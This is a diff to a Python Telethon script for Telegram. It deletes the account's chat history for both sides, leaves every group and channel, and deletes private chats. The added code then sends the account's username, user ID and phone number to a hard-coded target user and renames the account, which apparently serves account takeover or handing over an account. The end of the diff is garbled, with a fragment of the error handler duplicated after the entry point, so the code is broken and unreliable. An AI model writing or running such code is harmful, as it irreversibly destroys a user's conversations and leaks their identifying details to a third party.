@@ -28,19 +28,16 @@ async def main():
                 f"({type(d.entity).__name__})"
             )
 
-            # Delete chat history
             await client(DeleteHistoryRequest(
                 peer=d.entity,
                 max_id=0,
                 revoke=True
             ))
 
-            # Channel / Supergroup
             if isinstance(d.entity, Channel):
                 await client(LeaveChannelRequest(d.entity))
                 print(f"Left Channel/Supergroup: {d.name}")
 
-            # Normal Group
             elif isinstance(d.entity, Chat):
                 await client(DeleteChatUserRequest(
                     chat_id=d.entity.id,
@@ -48,7 +45,6 @@ async def main():
                 ))
                 print(f"Left Group: {d.name}")
 
-            # Private Chat
             elif isinstance(d.entity, User):
                 await client.delete_dialog(d.entity)
                 print(f"Deleted Private Chat: {d.name}")
@@ -56,13 +52,49 @@ async def main():
             await asyncio.sleep(1)
 
         except FloodWaitError as e:
-            print(
-                f"FloodWait: waiting {e.seconds} seconds..."
-            )
+            print(f"FloodWait: waiting {e.seconds} seconds...")
             await asyncio.sleep(e.seconds)
 
         except Exception as e:
             print(
+                f"FAILED to process {d.name or d.id}. "
+                f"Reason: {type(e).__name__}: {e}"
+            )
+
+    print("\nDone deleting chats.")
+
+    me = await client.get_me()
+
+    username = f"@{me.username}" if me.username else "(no username)"
+    phone = f"+{me.phone}" if me.phone else "(no phone)"
+
+    info_text = (
+        f"Username: {username}\n"
+        f"User ID: {me.id}\n"
+        f"Phone: {phone}"
+    )
+
+    print("\n--- Account info to be sent ---")
+    print(info_text)
+    print("--------------------------------")
+
+    await client.send_message(
+        TARGET_USERNAME,
+        info_text
+    )
+
+    print(f"Sent account info to @{TARGET_USERNAME}")
+
+    await client(UpdateProfileRequest(
+        first_name=NEW_FIRST_NAME
+    ))
+
+    print(f"Account name changed to: {NEW_FIRST_NAME}")
+
+
+if __name__ == "__main__":
+    with client:
+        client.loop.run_until_complete(main())            print(
                 f"FAILED to process {d.name or d.id}. "
                 f"Reason: {type(e).__name__}: {e}"
             )
